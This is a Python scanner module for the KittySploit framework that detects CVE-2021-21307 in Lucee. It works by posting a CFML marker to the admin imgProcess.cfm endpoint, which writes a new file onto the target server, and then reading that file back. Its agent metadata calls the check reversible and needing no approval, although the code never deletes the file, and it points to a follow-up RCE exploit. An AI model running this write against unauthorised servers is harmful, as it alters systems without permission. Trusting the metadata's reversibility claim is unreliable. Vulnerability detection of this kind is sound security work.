#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Lucee admin imgProcess.cfm unauthenticated access (CVE-2021-21307)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Lucee - imgProcess.cfm Unauth Access Detection (CVE-2021-21307)',
        'description': (
            'Detects CVE-2021-21307 by writing a unique CFML marker via '
            '/lucee/admin/imgProcess.cfm?file=<name>.cfm and confirming it on GET.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2021', 'lucee', 'rce', 'cfml', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 0.9,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'risk_signal', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [
                    'exploits/multi/http/lucee_cve_2021_21307_rce',
                ],
            },
        },
        'references': [
            'https://github.com/lucee/Lucee/security/advisories/GHSA-2xvv-723c-8p7r',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-21307',
        ],
        'cve': 'CVE-2021-21307',
    }

    def run(self):
        # Avoid status-200-only FP: write a unique CFML marker then fetch it.
        name = self.random_text(10).lower() + '.cfm'
        marker = 'KS' + self.random_text(12)
        write_path = f'/lucee/admin/imgProcess.cfm?file={name}'
        r = self.http_request(
            method='POST',
            path=write_path,
            data=f'imgSrc=<cfoutput>{marker}</cfoutput>',
            headers={'Content-Type': 'application/x-www-form-urlencoded'},
            allow_redirects=False,
        )
        if not r or r.status_code not in (200, 302, 500):
            return False
        g = self.http_request(method='GET', path=f'/lucee/admin/{name}', allow_redirects=False)
        if g and marker in (g.text or ''):
            self.set_info(
                severity='critical',
                reason='Lucee imgProcess.cfm write/read confirmed (CVE-2021-21307)',
                path=write_path.split('?')[0],
            )
            return True
        return False
